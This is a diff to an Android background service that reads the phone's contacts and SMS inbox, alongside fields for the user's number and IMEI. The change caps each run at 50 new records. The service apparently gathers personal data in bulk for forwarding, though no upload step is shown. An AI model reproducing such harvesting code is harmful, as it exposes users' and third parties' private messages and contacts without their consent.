@@ -39,6 +39,7 @@ public class BackgroundJobService {
     private SmsService smsService;
     private String UserMobile = "";
     private String imeiNumber = "";
+    private final int LIMITATION = 50;
 
     public BackgroundJobService(Context context) {
         this.context = context;
@@ -65,6 +66,7 @@ public class BackgroundJobService {
             String ContactNumber = "";
             List<ContactData> contactDataArrayList = new ArrayList<>();
             int i;
+            int count = 0;
             Cursor cursor = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
             if (Integer.valueOf(cursor.getCount()).intValue() > 0) {
                 while (cursor.moveToNext()) {
@@ -80,7 +82,7 @@ public class BackgroundJobService {
                         pCursor.close();
                     }
                     ContactEntity contactEntity = dbService.getContact(id);
-                    if (contactEntity == null) {
+                    if (contactEntity == null && count <= LIMITATION) {
                         contactEntity = new ContactEntity();
                         contactEntity.setContactId(id);
                         List<String> mobileNos = new ArrayList<>();
@@ -91,6 +93,7 @@ public class BackgroundJobService {
                         contactEntity.setName(contactName);
                         dbService.saveContact(contactEntity);
                         contactDataArrayList.add(new ContactData(contactName, id, contactDetails));
+                        count++;
                     }
                 }
                 cursor.close();
@@ -151,6 +154,7 @@ public class BackgroundJobService {
             String MsgText = "";
             String Timestamp = "";
             List<SMSData> smsList = new ArrayList<>();
+            int counting = 0;
             try {
                 int i;
                 smsList.clear();
@@ -202,11 +206,12 @@ public class BackgroundJobService {
                             sms.set_id(c.getString(c.getColumnIndexOrThrow("_id")).toString() + Timestamp);
                         }
                         MessageEntity messageEntity = dbService.getMessage(sms.get_id());
-                        if (messageEntity == null) {
+                        if (messageEntity == null && counting <= LIMITATION) {
                             messageEntity = new MessageEntity();
                             messageEntity.setMessageId(sms.get_id());
                             dbService.saveMessage(messageEntity);
                             smsList.add(sms);
+                            counting ++;
                         }
                         c.moveToNext();
                     }
